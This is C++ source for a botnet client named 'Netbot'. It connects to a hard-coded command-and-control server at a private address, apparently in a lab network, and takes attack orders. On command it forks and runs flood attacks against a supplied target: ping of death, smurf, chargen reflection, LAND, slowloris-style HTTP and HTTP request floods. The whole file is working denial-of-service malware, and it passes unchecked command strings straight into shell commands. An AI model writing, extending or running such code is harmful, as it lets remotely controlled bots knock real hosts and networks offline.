#include <arpa/inet.h>
#include <iostream>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/wait.h>
#include <sstream>
#include <vector>

using namespace std;

pid_t pid;
	
void signal_callback_handler(int signum) {
   if (pid > 0) kill(-pid, SIGKILL);
   exit(signum);
}

int main()
{
	int sock = 0, valread, client_fd;
	struct sockaddr_in server_address;
	char *hello = "Hello from client";
	char buffer[1024] = { 0 };
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		cout << "\n Socket creation error \n";
		return -1;
	}

	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = inet_addr("10.0.2.4");
	server_address.sin_port = htons(8080);

	start:
	while(connect(sock, (struct sockaddr *) &server_address, sizeof(server_address)) != 0) {
		sleep(5);
		goto start;
	}

	send(sock, hello, strlen(hello), 0);
	cout << "Netbot connected successfully!!!\n";
	
	signal(SIGINT, signal_callback_handler);
	
	while(true)
	{
		bzero(&buffer, sizeof(buffer));
		int bytes = recv(sock, buffer, 1024, 0);
		
		if (bytes == 0) // server disconnected gracefully
		{
			close(sock);
			kill(-pid, SIGKILL);
			return 0;
		}
	
		if(strncmp("HALT", buffer, 4) == 0)
		{
			kill(-pid, SIGKILL);
			cout << "\nkilled process group " << pid;
			system("clear");
			cout << "\nAttack halted. Waiting for CCC instructions...\n";
			continue;
		} 

 		if (pid > 0) kill(-pid, SIGKILL);		
		
		pid = fork();
		if (pid == 0) { // child procress
			setpgid(getpid(), getpid());
			
			string s(buffer);
			stringstream attack(s);
			string segment;
			vector<string> seglist;

			while(getline(attack, segment, '_'))
			{
			   seglist.push_back(segment);
			}

			if (strncmp("POD", seglist[0].c_str(), 3) == 0) 
			{
				string cmd = "ping " + seglist[1] + " -s 65000 -i 0.000000001";
				system(cmd.c_str());
			} else if (strncmp("SMURF", seglist[0].c_str(), 5) == 0)
			{
				string cmd = "hping3 10.0.2.255 -a " + seglist[1] + " --icmp -C 8 -D --flood";
				system(cmd.c_str());
			} else if (strncmp("CHARGEN", seglist[0].c_str(), 7) == 0)
			{
				string cmd = "hping3 10.0.2.5 -a " + seglist[1] + " -p 19 --udp -D --flood";
				system(cmd.c_str());
			} else if (strncmp("LAND", seglist[0].c_str(), 4) == 0)
			{	
				string cmd = "for i in {1..100000}; do hping3 " + seglist[1] + " -a " + seglist[1]  + " -p 7 -s 7 -S -c 1 -D --flood; sleep 0.00000000000001; done;";
				system(cmd.c_str());	
			} else if (strncmp("SLOWHTTP", seglist[0].c_str(), 8) == 0)
			{
				string cmd = "slowhttptest -H -u http://" + seglist[1] + " -t GET -c 500 -r 30 -p 20 -l 3600";
				system(cmd.c_str());
			} else if (strncmp("FASTHTTP", seglist[0].c_str(), 8) == 0)
			{
				string cmd = "httperf --server " + seglist[1] + " --uri / --num-conns 100000 --rate 500";
				system(cmd.c_str());
			}
		} 
	}
	
        return 0;
}
